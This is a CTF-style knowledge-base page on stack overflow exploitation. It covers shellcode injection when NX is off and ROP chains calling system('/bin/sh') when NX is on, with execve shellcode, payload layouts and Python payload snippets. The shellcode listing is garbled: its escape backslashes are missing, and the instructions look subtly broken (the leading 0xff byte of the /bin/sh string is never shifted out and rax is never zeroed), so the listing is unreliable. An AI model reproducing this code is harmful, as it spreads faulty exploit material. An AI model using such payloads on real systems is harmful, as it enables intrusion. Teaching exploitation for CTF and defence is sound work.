---
title: ROP Chains and Shellcode Injection
parent: Protection Bypass
grand_parent: Pwn
great_grand_parent: Knowledge Base
nav_order: 6
---

# ROP Chains and Shellcode Injection

This guide explains how to proceed based on whether the binary has **NX enabled** or **NX disabled**.

---

## Shellcode Injection (When NX is Disabled)

If NX (No-eXecute) is **disabled**, memory regions like the stack are executable.

### Exploitation Strategy

1. Overflow the buffer.
2. Inject custom shellcode onto the stack.
3. Overwrite the return address (RIP) to point to your shellcode.

### Example Shellcode (64-bit)

Execve shellcode to spawn a shell (`/bin/sh`):

```assembly
x48x31xd2                                  // xor    rdx, rdx
x48xbbxffx2fx62x69x6ex2fx73x68      // movabs rbx, 0x68732f6e69622fff
x53                                          // push   rbx
x48x89xe7                                  // mov    rdi, rsp
x50                                          // push   rax
x57                                          // push   rdi
x48x89xe6                                  // mov    rsi, rsp
xb0x3b                                      // mov    al, 0x3b
x0fx05                                      // syscall
```

### Payload Layout

```
[ padding to overflow buffer ]
[ shellcode ]
[ padding to reach RIP ]
[ stack address pointing to shellcode ]
```

Example Payload:
```python
payload = b"A" * offset
payload += shellcode
payload += b"B" * (rip_offset - len(shellcode))
payload += p64(shellcode_address)
```

---

## ROP Chain (When NX is Enabled)

If NX is **enabled**, the stack cannot be executed — you cannot jump to shellcode. You must reuse existing executable code (ROP).

### Exploitation Strategy

1. Find a leak to get libc or binary base address.
2. Find useful gadgets (`pop rdi; ret`, etc.).
3. Build a ROP chain to call `system("/bin/sh")`.

### Common Gadgets (64-bit)

- `pop rdi; ret` — to set up the first argument in `rdi`.
- Addresses of `system` and `"/bin/sh"` in libc.

### Typical ROP Payload

```
[ padding to overflow buffer ]
[ pop rdi; ret gadget address ]
[ address of "/bin/sh" string ]
[ address of system() function ]
```

Example:
```python
payload = b"A" * offset
payload += p64(pop_rdi_ret)
payload += p64(binsh_addr)
payload += p64(system_addr)
```

---

## Notes

- **NX disabled**: Use shellcode — easy.
- **NX enabled**: Use ROP chains — requires libc or binary leak.
- **64-bit ROP**: Arguments passed in registers (rdi, rsi, rdx).
- **32-bit ROP**: Arguments passed on the stack — different calling convention.

For information on how to leak libc addresses, see [Infoleak Techniques](infoleak.md).
